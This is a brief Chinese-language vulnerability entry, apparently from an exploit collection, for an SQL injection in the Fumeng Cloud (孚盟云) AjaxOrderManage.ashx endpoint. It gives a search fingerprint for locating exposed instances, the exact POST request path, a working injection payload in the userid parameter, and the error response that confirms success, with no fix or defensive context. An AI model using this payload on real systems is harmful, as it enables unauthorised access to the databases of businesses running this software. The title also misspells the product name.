# 浮盟云AjaxOrderManage存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxOrderManage.ashx HTTP/1.1`

**Payload**
```
action=getsalesfunnel&userid='-1/user--
```
- **响应特征**：500 用户